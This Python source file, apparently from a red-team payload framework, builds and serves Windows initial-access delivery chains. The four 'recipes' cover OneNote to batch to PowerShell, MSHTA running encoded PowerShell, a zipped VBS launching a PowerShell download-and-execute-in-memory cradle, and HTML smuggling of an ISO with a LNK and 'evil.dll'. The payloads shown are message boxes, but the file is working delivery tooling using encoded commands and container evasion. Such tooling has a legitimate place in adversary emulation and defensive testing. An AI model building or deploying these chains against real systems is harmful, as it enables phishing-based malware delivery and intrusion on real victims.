from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.zip.zip import makeZip
from make.vbs.vbs import *
from make.mshta.mshta import *
from make.onenote.onenote import *
from make.bat.bat import *

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute
from web import serve


def recipe_4():
    # OneNote -> Bat -> PowerShell:MessageBox
    routes = []

    # PS-A
    ps1msgbox: AceStr = makePowershellMessageBox()
    ps1msgbox = makePowershellCommand(ps1msgbox)
    cmdline = AceStr("powershell -c \"{}\"".format(ps1msgbox))

    # BAT, for Debugging
    # bat = makeBatFtpExec(cmdline)
    # batFile: AceFile = makeAceFile("test.bat", bat)

    # OneNote
    onenote = makeOnenoteBat(cmdline)
    #onenoteFile: AceFile = makeAceFile("test.one", onenote)  # for debugging

    # Serve
    containerServe: AceRoute = AceRoute('/test.one', onenote, download=True, downloadName='test.one')
    routes.append(containerServe)
    serve(routes)


def recipe_3():
    # MSHTA -> Powershell:MessageBox
    routes = []

    # PS-A
    ps1msgbox: AceStr = makePowershellMessageBox()
    ps1msgbox: AceStr = makePowershellEncodedCommand(ps1msgbox)

    # MSHTA
    cmd = AceStr("powershell.exe -EncodedCommand {}".format(ps1msgbox))
    mshta: AceStr = makeMshtaJscriptExec(cmd)

    mshtaFile: AceFile = makeAceFile("test.hta", mshta)

    containerServe: AceRoute = AceRoute('/test.hta', mshta, download=True, downloadName='test.hta')
    routes.append(containerServe)

    # start
    serve(routes)


def recipe_2():
    # ZIP -> VBS -> Powershell:Download+Exec <- Powershell-Messagebox
    routes = []

    # PS-A
    ps1msgbox: AceStr = makePowershellMessageBox()
    ps1msgboxHtml: AceRoute = AceRoute('/ps-msgbox', ps1msgbox)
    routes.append(ps1msgboxHtml)

    # PS-B
    ps1downloader: AceStr = makePowershellDownloadAndExecuteMemPs1(
        url='http://localhost:5000/ps-msgbox',
    )

    # VBS
    ps1downloader: AceStr = makePowershellEncodedCommand(ps1downloader)
    vbsExec: AceStr = makeVbsExecEncPs1(ps1downloader)
    vbsExecFile: AceFile = makeAceFile('test.vbs', vbsExec)

    # ZIP
    container: AceBytes = makeZip(
        files = [
            vbsExecFile,
        ],
    )
    containerServe: AceRoute = AceRoute('/test.zip', container, download=True, downloadName='test.zip')
    routes.append(containerServe)

    # start
    serve(routes)


def recipe_1():
    # HTML Smuggling -> ISO -> ( LNK -> Powershell:Load&Exec <- DLL )

    # DLL
    dllData: AceBytes = readFileContent('payloads/evil.dll')
    dllFile: AceFile = makeAceFile('evil.dll', dllData)

    psMsgbox: AceStr = makePowershellMessageBox()
    # LNK to powershell.exe to execute DLL
    execData: AceStr = makePowershellEncodedCommand(
        input=psMsgbox,
    )
    lnkData: AceBytes = makeLnk(
        name = "clickme.lnk",
        target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        arguments = "-noexit -EncodedCommand {}".format(execData),
    )
    lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)

    # Pack DLL and LNK into ISO
    container: AceBytes = makeIso(
        files = [
            dllFile,
            lnkFile,
        ],
    )
    containerFile: AceFile = makeAceFile('test.iso', container)

    # HTML to serve ISO
    html: AceStr = makeHtmlSmuggling(
        containerFile,
        template='autodownload.html',
    )

    # serve HTML
    serveHtml: AceRoute = AceRoute('/test', html)
    serve([serveHtml])
